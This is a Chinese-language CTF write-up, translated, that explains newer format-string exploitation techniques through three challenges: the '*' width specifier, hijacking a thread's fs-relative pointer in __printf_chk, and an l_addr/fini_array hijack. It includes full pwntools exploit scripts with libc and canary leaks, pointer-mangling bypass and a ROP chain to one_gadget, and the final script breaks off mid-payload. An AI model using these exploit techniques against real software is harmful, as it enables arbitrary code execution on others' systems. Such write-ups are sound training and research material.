# 四道题看格串新的利用方式
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
作者:nuoye@星盟
## 前言
相对于基本的%p进行leak和%n写入，最近几年出现了不少新的格式化字符串的利用方式，这里以四道题为例，讲下四个新的方法。
## 正文
###  2020 ciscn 华南分区赛 : same
这道题主要涉及到到一个比较偏的格串符号`*`，在[wiki](https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2)中可以看到关于它的用法：
知道这一点，下面的题目也就不难了。
首先看下程序流程：
即输入一个数以及一个9字节的格式化字符串，从而使上述输入的数与v3的值相同。
其中v3的值为随机数：
这里因为限制了只能输入9个字节，所以需要用到`*`(type，表示取对应函数参数的值)，其payload为：`%7*$p%6$n`。这样即可将v3（在格串中对应偏移为7）的值输入到v4（偏移为6）中，使两数相等，进而getshell。
###  2020 ciscn 线下 awd ：pwn3thread
这道题本质上还是属于栈溢出的内容，但因为涉及到printf函数中的一个函数劫持，所以也可以归为格串的利用。
main函数如下：
即重复创建线程并等待返回。
线程中执行的函数：
该函数中首先保存了返回地址，并在结束前恢复返回地址，所以无法通过劫持该函数的返回地址来进行getshell。
该程序中用到了`__printf_chk`函数，该函数与printf的区别在于：
  * 不能使用 `%x$n` 不连续地打印，也就是说如果要使用 `%3$n`，则必须同时使用 `%1$n` 和 `%2$n`。
  * 在使用 `%n` 的时候会做一些检查。
`__printf_chk`调用过程中有一个的`buffered_vfprintf`函数，相应漏洞内容如下：
其中fs寄存器指向线程栈地址之后连续的一块地址，因此可以通过栈溢出劫持该指针，进而达到任意代码执行的目的。
思路：
  1. 利用`%p`打印出`libc`地址和`canary`值，以便栈溢出
  2. 泄漏处`libc+0x3F0990`处的值，并进行移位操作，再与onegadget进行异或得到一格特定值。
  3. 将该特定值通过栈溢出的方式写入到fs+0x30处，从而达到getshell目的。
exp：
    from pwn import *
    p = process("./pwn")
    libc = ELF("./pwn").libc
    one = [0x4f3d5,0x4f432,0x10a41c]
    def ROR(i,index):
        tmp = bin(i)[2:]
        tmp = (64-len(tmp))*'0'+tmp
        for j in range(index):
            tmp = tmp[-1]+tmp[:-1]
        return int(tmp,2)
    #leak libc and canary
    i = 7+5
    p.sendline("%p"*i)
    p.recvuntil("0x")
    libc_base =int(p.recv(12),16)-0x3ED8D0
    libc.address = libc_base
    print hex(libc_base)
    for i in range(i-5):
        p.recvuntil("0x")
    canary =int(p.recv(),16)
    print hex(canary)
    #leak libc+0x3F0988
    payload = '%p'*6+'%s'+'aa'+p64(libc.address+0x3F0988)
    p.sendline(payload)
    p.recvuntil("025")
    p.recvuntil("0x")
    p.recvuntil("6161732570257025")
    #overflow and getshell
    a = u64(p.recv(8))
    b = ROR(a,0x11)
    c = b ^ libc.address+one[1]
    print hex(a)
    print hex(b)
    payload = "a"*0x38+p64(canary)
    payload = payload.ljust(0x850,'\x00')
    payload += p64(0)*6+p64(c)
    p.sendline(payload)
    p.interactive()
###  2019 delta ctf : unprintable
很经典的一道关于格式化字符串的利用，这里也稍微讲解一下。
程序截图如下：
关闭了回显，并且存在格式化字符串漏洞，但是直接通过exit函数退出了，并且栈上也没有什么可以利用的点：
但细心点可以发现下面两个地址：
在调用exit函数退出程序时，会调用到的`_dl_fini`函数，而该函数会根据link_map的l_addr偏移量来调用`&fini_ararry+l_addr`中存放的函数：
    if (l->l_info[DT_FINI_ARRAY] != NULL)
    {
        ElfW(Addr) *array =
        (ElfW(Addr) *) (l->l_addr+ l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
        unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr)));
        while (i-- > 0)
        ((fini_t) array[i]) ();
    }
在gdb中调试可以发现如下代码：
可以看到将会调用`[0x600e38+8]+[rbx]`处的值对应的函数，而其中rbx即是上面`_dl_init+139`前一个地址，该地址即为l_addr的地址。
利用该漏洞，可以通过修改l_addr，从而再一次进行read和printf，并且这一次在栈上我们可以发现一些有用的东西：
通过劫持这几个地址即可重复的实现格式化字符串漏洞的利用。接着通过编写rop串将stderr修改为onegadget然后执行即可。
exp：
    from pwn import *
    p = process("./de1ctf_2019_unprintable",env={'LD_PRELOAD':'./libc-2.23.so'})
    libc = ELF("./libc-2.23.so")
    #获取stack地址，并计算出要修改的地址
    p.recvuntil("0x")
    stack = int(p.recv(12),16)-0x110-8
    print hex(stack)
    #劫持l_addr，从而在buf中伪造fini_array，再一次读并输出格式化字符串
    payload = "%"+str(0x298)+"c%26$hn"
    payload = payload.ljust(0x10,'\x00')+p64(0x4007A3)
    p.send(payload)
    sleep(1)
    pop_rsp = 0x000000000040082d
    csu_pop = 0x000000000040082A
    csu_call = 0x0000000000400810
    stderr_ptr_addr = 0x0000000000601040
    stdout_ptr_addr = 0x0000000000601020
    one = [0x45226,0x4527a,0xf0364,0xf1207]
    one = [0x45216,0x4526a,0xf02a4,0xf1147]
    one_gadget = one[3]
    offset = one_gadget - libc.sym['_IO_2_1_stderr_']
    adc_p_rbp_edx = 0x00000000004006E8
    rop_addr = 0x0000000000601260
    tmp = stderr_ptr_addr-0x48
    #利用adc将stderr修改为one_gadget
    rop = p64(csu_pop)
    rop += p64(tmp-1) #rbx
    rop += p64(tmp) #rbp
    rop += p64(rop_addr + 0x8 * 6 - tmp * 8 + 0x10000000000000000) #r12
    rop += p64(offset + 0x10000000000000000) #r13
    rop += p64(adc_p_rbp_edx) #r14
    rop += p64(0) #r15
    rop += p64(csu_call)
    #call onegadget
    rop += p64(csu_pop)
    rop += p64(0) #rbx
    rop += p64(1) #rbp
    rop += p64(stderr_ptr_addr) #r12
    rop += p64(0) #r13
    rop += p64(0) #r14
    rop += p64(0) #r15
    rop += p64(csu_call)
    rop_addr = rop_addr-0x18
    addr1 = rop_addr&0xffff+0x10000
    addr2 = (rop_addr>>16)&0xffff+0x10000
    addr3 = (rop_addr>>32)&0xffff+0x10000
    #0 劫持printf的返回地址，并将指针指向返回地址的下一地址，方便后面迁栈
    payload = '%' + str(0xA3) + 'c%23$hhn'
    payload += '%' + str((stack-0xa3)&0xff) + 'c%18$hhn'
    p.send(payload)
    sleep(1)
    #1-2为迁栈过程，即不断劫持printf的返回地址，并依次将下一地址修改为指向buf上存放rop串处，并且最终将返回地址改为pop rsp，从而执行rop串
    #1 
    stack = stack+2
    payload = '%' + str(0xA3) + 'c%23$hhn'
    tmp1 = (stack-0xa3)&0xff
    payload += '%' + str(tmp1) + 'c%18$hhn'
    tmp2 = tmp1+0xa3
    payload += '%' + str((addr1-tmp2)&0xffff) + 'c%13$hn'